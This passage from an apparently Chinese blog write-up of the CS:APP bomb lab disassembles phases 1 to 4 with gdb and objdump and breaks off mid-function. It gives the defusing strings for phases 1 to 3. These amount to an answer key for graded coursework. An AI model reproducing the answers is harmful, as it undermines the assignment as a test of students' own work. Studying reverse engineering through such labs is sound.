</span></span><br><span class="line"><span class="comment">     * defuse each phase, you can add its defusing string to &lt;file&gt; and</span></span><br><span class="line"><span class="comment">     * avoid having to retype it. */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (argc == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(infile = fopen(argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>))) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: Error: Couldn&#x27;t open %s\n&quot;</span>, argv[<span class="number">0</span>], argv[<span class="number">1</span>]);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* You can&#x27;t call the bomb with more than 1 command line argument. */</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s [&lt;input_file&gt;]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Do all sorts of secret stuff that makes the bomb harder to defuse. */</span></span><br><span class="line">    initialize_bomb();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to my fiendish little bomb. You have 6 phases with\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;which to blow yourself up. Have a nice day!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Hmm...  Six phases must be more secure than one phase! */</span></span><br><span class="line">    input = read_line();             <span class="comment">/* Get input                   */</span></span><br><span class="line">    phase_1(input);                  <span class="comment">/* Run the phase               */</span></span><br><span class="line">    phase_defused();                 <span class="comment">/* Drat!  They figured it out!</span></span><br><span class="line"><span class="comment">                                      * Let me know how they did it. */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Phase 1 defused. How about the next one?\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The second phase is harder.  No one will ever figure out</span></span><br><span class="line"><span class="comment">     * how to defuse this... */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_2(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;That&#x27;s number 2.  Keep going!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* I guess this is too easy so far.  Some more complex code will</span></span><br><span class="line"><span class="comment">     * confuse people. */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_3(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Halfway there!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Oh yeah?  Well, how good is your math?  Try on this saucy problem! */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_4(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;So you got that one.  Try this one.\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Round and &#x27;round in memory we go, where we stop, the bomb blows! */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_5(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Good work!  On to the next...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This phase will never be used, since no one will get past the</span></span><br><span class="line"><span class="comment">     * earlier ones.  But just in case, make this one extra hard. */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_6(input);</span><br><span class="line">    phase_defused();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Wow, they got it!  But isn&#x27;t something... missing?  Perhaps</span></span><br><span class="line"><span class="comment">     * something they overlooked?  Mua ha ha ha ha! */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase-1"></a>Phase-1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400ee4:	be 00 24 40 00       	mov    $0x402400,%esi</span><br><span class="line">  400ee9:	e8 4a 04 00 00       	call   401338 &lt;strings_not_equal&gt;</span><br><span class="line">  400eee:	85 c0                	test   %eax,%eax</span><br><span class="line">  400ef0:	74 05                	je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">  400ef2:	e8 43 05 00 00       	call   40143a &lt;explode_bomb&gt;</span><br><span class="line">  400ef7:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  400efb:	c3                   	ret</span><br><span class="line">  </span><br><span class="line">0000000000401338 &lt;strings_not_equal&gt;:</span><br><span class="line">  401338:	41 54                	push   %r12</span><br><span class="line">  40133a:	55                   	push   %rbp</span><br><span class="line">  40133b:	53                   	push   %rbx</span><br><span class="line">  40133c:	48 89 fb             	mov    %rdi,%rbx</span><br><span class="line">  40133f:	48 89 f5             	mov    %rsi,%rbp</span><br><span class="line">  401342:	e8 d4 ff ff ff       	call   40131b &lt;string_length&gt;</span><br><span class="line">  401347:	41 89 c4             	mov    %eax,%r12d</span><br><span class="line">  40134a:	48 89 ef             	mov    %rbp,%rdi</span><br><span class="line">  40134d:	e8 c9 ff ff ff       	call   40131b &lt;string_length&gt;</span><br><span class="line">  401352:	ba 01 00 00 00       	mov    $0x1,%edx</span><br><span class="line">  401357:	41 39 c4             	cmp    %eax,%r12d</span><br><span class="line">  40135a:	75 3f                	jne    40139b &lt;strings_not_equal+0x63&gt;</span><br><span class="line">  40135c:	0f b6 03             	movzbl (%rbx),%eax</span><br><span class="line">  40135f:	84 c0                	test   %al,%al</span><br><span class="line">  401361:	74 25                	je     401388 &lt;strings_not_equal+0x50&gt;</span><br><span class="line">  401363:	3a 45 00             	cmp    0x0(%rbp),%al</span><br><span class="line">  401366:	74 0a                	je     401372 &lt;strings_not_equal+0x3a&gt;</span><br><span class="line">  401368:	eb 25                	jmp    40138f &lt;strings_not_equal+0x57&gt;</span><br><span class="line">  40136a:	3a 45 00             	cmp    0x0(%rbp),%al</span><br><span class="line">  40136d:	0f 1f 00             	nopl   (%rax)</span><br><span class="line">  401370:	75 24                	jne    401396 &lt;strings_not_equal+0x5e&gt;</span><br><span class="line">  401372:	48 83 c3 01          	add    $0x1,%rbx</span><br><span class="line">  401376:	48 83 c5 01          	add    $0x1,%rbp</span><br><span class="line">  40137a:	0f b6 03             	movzbl (%rbx),%eax</span><br><span class="line">  40137d:	84 c0                	test   %al,%al</span><br><span class="line">  40137f:	75 e9                	jne    40136a &lt;strings_not_equal+0x32&gt;</span><br><span class="line">  401381:	ba 00 00 00 00       	mov    $0x0,%edx</span><br><span class="line">  401386:	eb 13                	jmp    40139b &lt;strings_not_equal+0x63&gt;</span><br><span class="line">  401388:	ba 00 00 00 00       	mov    $0x0,%edx</span><br><span class="line">  40138d:	eb 0c                	jmp    40139b &lt;strings_not_equal+0x63&gt;</span><br><span class="line">  40138f:	ba 01 00 00 00       	mov    $0x1,%edx</span><br><span class="line">  401394:	eb 05                	jmp    40139b &lt;strings_not_equal+0x63&gt;</span><br><span class="line">  401396:	ba 01 00 00 00       	mov    $0x1,%edx</span><br><span class="line">  40139b:	89 d0                	mov    %edx,%eax</span><br><span class="line">  40139d:	5b                   	pop    %rbx</span><br><span class="line">  40139e:	5d                   	pop    %rbp</span><br><span class="line">  40139f:	41 5c                	pop    %r12</span><br><span class="line">  4013a1:	c3                   	ret</span><br></pre></td></tr></table></figure>

<p>分析汇编代码可以知道，<code>phase_1(input)</code>实际上是调用<code>strings_not_equal(input, 字符串)</code>，这个字符串的地址在这条汇编语句中找到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">400ee4:	be 00 24 40 00       	mov    $0x402400,%esi</span><br></pre></td></tr></table></figure>

<p>利用gdb打印对应地址的字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x402400</span><br><span class="line">0x402400:       &quot;Border relations with Canada have never been better.&quot;</span><br></pre></td></tr></table></figure>

<p>输入该字符串Phase-1就通过了。</p>
<h3 id="Answer"><a href="#Answer" class="headerlink" title="Answer"></a>Answer</h3><ul>
<li>Border relations with Canada have never been better.</li>
</ul>
<h2 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase-2"></a>Phase-2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_2:</span><br><span class="line">   0x0000000000400efc &lt;+0&gt;:     push   %rbp</span><br><span class="line">   0x0000000000400efd &lt;+1&gt;:     push   %rbx</span><br><span class="line">   0x0000000000400efe &lt;+2&gt;:     sub    $0x28,%rsp</span><br><span class="line">   0x0000000000400f02 &lt;+6&gt;:     mov    %rsp,%rsi</span><br><span class="line">   0x0000000000400f05 &lt;+9&gt;:     call   0x40145c &lt;read_six_numbers&gt;</span><br><span class="line">   0x0000000000400f0a &lt;+14&gt;:    cmpl   $0x1,(%rsp)</span><br><span class="line">   0x0000000000400f0e &lt;+18&gt;:    je     0x400f30 &lt;phase_2+52&gt;</span><br><span class="line">   0x0000000000400f10 &lt;+20&gt;:    call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f15 &lt;+25&gt;:    jmp    0x400f30 &lt;phase_2+52&gt;</span><br><span class="line">   0x0000000000400f17 &lt;+27&gt;:    mov    -0x4(%rbx),%eax</span><br><span class="line">   0x0000000000400f1a &lt;+30&gt;:    add    %eax,%eax</span><br><span class="line">   0x0000000000400f1c &lt;+32&gt;:    cmp    %eax,(%rbx)</span><br><span class="line">   0x0000000000400f1e &lt;+34&gt;:    je     0x400f25 &lt;phase_2+41&gt;</span><br><span class="line">   0x0000000000400f20 &lt;+36&gt;:    call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f25 &lt;+41&gt;:    add    $0x4,%rbx</span><br><span class="line">   0x0000000000400f29 &lt;+45&gt;:    cmp    %rbp,%rbx</span><br><span class="line">   0x0000000000400f2c &lt;+48&gt;:    jne    0x400f17 &lt;phase_2+27&gt;</span><br><span class="line">   0x0000000000400f2e &lt;+50&gt;:    jmp    0x400f3c &lt;phase_2+64&gt;</span><br><span class="line">   0x0000000000400f30 &lt;+52&gt;:    lea    0x4(%rsp),%rbx</span><br><span class="line">   0x0000000000400f35 &lt;+57&gt;:    lea    0x18(%rsp),%rbp</span><br><span class="line">   0x0000000000400f3a &lt;+62&gt;:    jmp    0x400f17 &lt;phase_2+27&gt;</span><br><span class="line">   0x0000000000400f3c &lt;+64&gt;:    add    $0x28,%rsp</span><br><span class="line">   0x0000000000400f40 &lt;+68&gt;:    pop    %rbx</span><br><span class="line">   0x0000000000400f41 &lt;+69&gt;:    pop    %rbp</span><br><span class="line">   0x0000000000400f42 &lt;+70&gt;:    ret</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function read_six_numbers:</span><br><span class="line">   0x000000000040145c &lt;+0&gt;:     sub    $0x18,%rsp</span><br><span class="line">   0x0000000000401460 &lt;+4&gt;:     mov    %rsi,%rdx</span><br><span class="line">   0x0000000000401463 &lt;+7&gt;:     lea    0x4(%rsi),%rcx</span><br><span class="line">   0x0000000000401467 &lt;+11&gt;:    lea    0x14(%rsi),%rax</span><br><span class="line">   0x000000000040146b &lt;+15&gt;:    mov    %rax,0x8(%rsp)</span><br><span class="line">   0x0000000000401470 &lt;+20&gt;:    lea    0x10(%rsi),%rax</span><br><span class="line">   0x0000000000401474 &lt;+24&gt;:    mov    %rax,(%rsp)</span><br><span class="line">   0x0000000000401478 &lt;+28&gt;:    lea    0xc(%rsi),%r9</span><br><span class="line">   0x000000000040147c &lt;+32&gt;:    lea    0x8(%rsi),%r8</span><br><span class="line">   0x0000000000401480 &lt;+36&gt;:    mov    $0x4025c3,%esi</span><br><span class="line">   0x0000000000401485 &lt;+41&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x000000000040148a &lt;+46&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x000000000040148f &lt;+51&gt;:    cmp    $0x5,%eax</span><br><span class="line">   0x0000000000401492 &lt;+54&gt;:    jg     0x401499 &lt;read_six_numbers+61&gt;</span><br><span class="line">   0x0000000000401494 &lt;+56&gt;:    call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401499 &lt;+61&gt;:    add    $0x18,%rsp</span><br><span class="line">   0x000000000040149d &lt;+65&gt;:    ret</span><br></pre></td></tr></table></figure>

<p><code>phase_2</code>内部是一个循环，判断获取到的6个数字是否满足：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">arr[6] = input()</span><br><span class="line">if arr[0] != 1:</span><br><span class="line">	explode_bomb()</span><br><span class="line">for i from 1 to 5:</span><br><span class="line">	if arr[i] != 2 * arr[i-1]:</span><br><span class="line">		explode_bomb()	</span><br></pre></td></tr></table></figure>



<h3 id="Answer-1"><a href="#Answer-1" class="headerlink" title="Answer"></a>Answer</h3><ul>
<li>1 2 4 8 16 32</li>
</ul>
<h2 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase-3"></a>Phase-3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_3:</span><br><span class="line">=&gt; 0x0000000000400f43 &lt;+0&gt;:     sub    $0x18,%rsp</span><br><span class="line">   0x0000000000400f47 &lt;+4&gt;:     lea    0xc(%rsp),%rcx</span><br><span class="line">   0x0000000000400f4c &lt;+9&gt;:     lea    0x8(%rsp),%rdx</span><br><span class="line">   0x0000000000400f51 &lt;+14&gt;:    mov    $0x4025cf,%esi</span><br><span class="line">   0x0000000000400f56 &lt;+19&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x0000000000400f5b &lt;+24&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x0000000000400f60 &lt;+29&gt;:    cmp    $0x1,%eax</span><br><span class="line">   0x0000000000400f63 &lt;+32&gt;:    jg     0x400f6a &lt;phase_3+39&gt;</span><br><span class="line">   0x0000000000400f65 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f6a &lt;+39&gt;:    cmpl   $0x7,0x8(%rsp)</span><br><span class="line">   0x0000000000400f6f &lt;+44&gt;:    ja     0x400fad &lt;phase_3+106&gt;</span><br><span class="line">   0x0000000000400f71 &lt;+46&gt;:    mov    0x8(%rsp),%eax</span><br><span class="line">   0x0000000000400f75 &lt;+50&gt;:    jmp    *0x402470(,%rax,8)</span><br><span class="line">   0x0000000000400f7c &lt;+57&gt;:    mov    $0xcf,%eax</span><br><span class="line">   0x0000000000400f81 &lt;+62&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f83 &lt;+64&gt;:    mov    $0x2c3,%eax</span><br><span class="line">   0x0000000000400f88 &lt;+69&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f8a &lt;+71&gt;:    mov    $0x100,%eax</span><br><span class="line">   0x0000000000400f8f &lt;+76&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f91 &lt;+78&gt;:    mov    $0x185,%eax</span><br><span class="line">   0x0000000000400f96 &lt;+83&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f98 &lt;+85&gt;:    mov    $0xce,%eax</span><br><span class="line">   0x0000000000400f9d &lt;+90&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f9f &lt;+92&gt;:    mov    $0x2aa,%eax</span><br><span class="line">   0x0000000000400fa4 &lt;+97&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fa6 &lt;+99&gt;:    mov    $0x147,%eax</span><br><span class="line">   0x0000000000400fab &lt;+104&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fad &lt;+106&gt;:   call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400fb2 &lt;+111&gt;:   mov    $0x0,%eax</span><br><span class="line">   0x0000000000400fb7 &lt;+116&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fb9 &lt;+118&gt;:   mov    $0x137,%eax</span><br><span class="line">   0x0000000000400fbe &lt;+123&gt;:   cmp    0xc(%rsp),%eax</span><br><span class="line">   0x0000000000400fc2 &lt;+127&gt;:   je     0x400fc9 &lt;phase_3+134&gt;</span><br><span class="line">   0x0000000000400fc4 &lt;+129&gt;:   call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400fc9 &lt;+134&gt;:   add    $0x18,%rsp</span><br><span class="line">   0x0000000000400fcd &lt;+138&gt;:   ret</span><br></pre></td></tr></table></figure>

<p>这里通过<code>sscanf(input, &quot;%d %d&quot;, &amp;a, &amp;b)</code>从input读入两个数字</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x4025cf</span><br><span class="line">0x4025cf:       &quot;%d %d&quot;</span><br></pre></td></tr></table></figure>

<p>分析下面的汇编代码，答案是根据第一个输入a的值决定的，b对应的值与<code>0x402470</code>处的数组存储的8个数字有关，因此该phase有多种答案。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400f71 &lt;+46&gt;: mov 0x8(%rsp),%eax</span><br><span class="line">0x0000000000400f75 &lt;+50&gt;: jmp *0x402470(,%rax,8)</span><br><span class="line">0x0000000000400f7c &lt;+57&gt;: mov $0xcf,%eax</span><br><span class="line">0x0000000000400f81 &lt;+62&gt;: jmp 0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">0x0000000000400f83 &lt;+64&gt;: mov $0x2c3,%eax</span><br><span class="line">0x0000000000400f88 &lt;+69&gt;: jmp 0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">0x0000000000400f8a &lt;+71&gt;: mov $0x100,%eax</span><br><span class="line">0x0000000000400f8f &lt;+76&gt;: jmp 0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">0x0000000000400f91 &lt;+78&gt;: mov $0x185,%eax</span><br><span class="line">0x0000000000400f96 &lt;+83&gt;: jmp 0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">0x0000000000400f98 &lt;+85&gt;: mov $0xce,%eax</span><br><span class="line">0x0000000000400f9d &lt;+90&gt;: jmp 0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">0x0000000000400f9f &lt;+92&gt;: mov $0x2aa,%eax</span><br><span class="line">0x0000000000400fa4 &lt;+97&gt;: jmp 0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">0x0000000000400fa6 &lt;+99&gt;: mov $0x147,%eax</span><br><span class="line">0x0000000000400fab &lt;+104&gt;: jmp 0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">0x0000000000400fad &lt;+106&gt;: call 0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x0000000000400fb2 &lt;+111&gt;: mov $0x0,%eax</span><br><span class="line">0x0000000000400fb7 &lt;+116&gt;: jmp 0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">0x0000000000400fb9 &lt;+118&gt;: mov $0x137,%eax</span><br><span class="line">0x0000000000400fbe &lt;+123&gt;: cmp 0xc(%rsp),%eax</span><br><span class="line">0x0000000000400fc2 &lt;+127&gt;: je 0x400fc9 &lt;phase_3+134&gt;</span><br><span class="line">0x0000000000400fc4 &lt;+129&gt;: call 0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x0000000000400fc9 &lt;+134&gt;: add $0x18,%rsp</span><br><span class="line"></span><br><span class="line">(gdb) x/64x 0x402470</span><br><span class="line">0x402470: 0x7c 0x0f 0x40 0x00 0x00 0x00 0x00 0x00</span><br><span class="line">0x402478: 0xb9 0x0f 0x40 0x00 0x00 0x00 0x00 0x00</span><br><span class="line">0x402480: 0x83 0x0f 0x40 0x00 0x00 0x00 0x00 0x00</span><br><span class="line">0x402488: 0x8a 0x0f 0x40 0x00 0x00 0x00 0x00 0x00</span><br><span class="line">0x402490: 0x91 0x0f 0x40 0x00 0x00 0x00 0x00 0x00</span><br><span class="line">0x402498: 0x98 0x0f 0x40 0x00 0x00 0x00 0x00 0x00</span><br><span class="line">0x4024a0: 0x9f 0x0f 0x40 0x00 0x00 0x00 0x00 0x00</span><br><span class="line">0x4024a8: 0xa6 0x0f 0x40 0x00 0x00 0x00 0x00 0x00</span><br></pre></td></tr></table></figure>



<h3 id="Answer-2"><a href="#Answer-2" class="headerlink" title="Answer"></a>Answer</h3><ul>
<li>0 207</li>
<li>…</li>
</ul>
<h2 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase-4"></a>Phase-4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_4:</span><br><span class="line">   0x000000000040100c &lt;+0&gt;:     sub    $0x18,%rsp</span><br><span class="line">   0x0000000000401010 &lt;+4&gt;:     lea    0xc(%rsp),%rcx</span><br><span class="line">   0x0000000000401015 &lt;+9&gt;:     lea    0x8(%rsp),%rdx</span><br><span class="line">   0x000000000040101a &lt;+14&gt;:    mov    $0x4025cf,%esi</span><br><span class="line">   0x000000000040101f &lt;+19&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x0000000000401024 &lt;+24&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x0000000000401029 &lt;+29&gt;:    cmp    $0x2,%eax</span><br><span class="line">   0x000000000040102c &lt;+32&gt;:    jne    0x401035 &lt;phase_4+41&gt;</span><br><span class="line">   0x000000000040102e &lt;+34&gt;:    cmpl   $0xe,0x8(%rsp)</span><br><span class="line">   0x0000000000401033 &lt;+39&gt;:    jbe    0x40103a &lt;phase_4+46&gt;</span><br><span class="line">   0x0000000000401035 &lt;+41&gt;:    call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000040103a &lt;+46&gt;:    mov    $0xe,%edx</span><br><span class="line">   0x000000000040103f &lt;+51&gt;:    mov    $0x0,%esi</span><br><span class="line">   0x0000000000401044 &lt;+56&gt;:    mov    0x8(%rsp),%edi</span><br><span class="line">   0x0000000000401048 &lt;+60&gt;:    call   0x400fce &lt;func4&gt;</span><br><span class="line">   0x000000000040104d &lt;+65&gt;:    test   %eax,%eax</span><br><span class="line">   0x000000000040104f &lt;+67&gt;:    jne    0x401058 &lt;phase_4+76&gt;</span><br><span class="line">   0x0000000000401051 &lt;+69&gt;:    cmpl   $0x0,0xc(%rsp)</span><br><span class="line">   0x0000000000401056 &lt;+74&gt;:    je     0x40105d &lt;phase_4+81&gt;</span><br><span class="line">   0x0000000000401058 &lt;+76&gt;:    call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000040105d &lt;+81&gt;:    add    $0x18,%rsp</span><br><span class="line">   0x0000000000401061 &lt;+85&gt;:    ret</span><br><span class="line">   </span><br><span class="line">Dump of assembler code for function func4:</span><br><span class="line">   0x0000000000400fce &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   0x0000000000400fd2 &lt;+4&gt;:     mov    %edx,%eax</span><br><span class="line">   0x0000000000400fd4 &lt;+6&gt;:     sub    %esi,%eax</span><br><span class="line">   0x0000000000400fd6 &lt;+8&gt;:     mov    %eax,%ecx</span><br><span class="line">   0x0000000000400fd8 &lt;+10&gt;:    shr    $0x1f,%ecx</span><br><span class="line">   0x0000000000400fdb &lt;+13&gt;:    add    %ecx,%eax</span><br><span class="line">   0x0000000000400fdd &lt;+15&gt;:    sar    %eax</span><br><span class="line">   0x0000000000400fdf &lt;+17&gt;:    lea    (%rax,%rsi,1),%ecx</span><br><span class="line">   0x0000000000400fe2 &lt;+20&gt;:    cmp    %edi,%ecx</span><br><span class="line">   0x0000000000400fe4 &lt;+22&gt;:    jle    0x400ff2 &lt;func4+36&gt;</span><br><span class="line">   0x0000000000400fe6 &lt;+24&gt;:    lea    -0x1(%rcx),%edx</span><br><span class="line">   0x0000000000400fe9 &lt;+27&gt;:    call   0x400fce &lt;func4&gt;</span><br><span class="line">   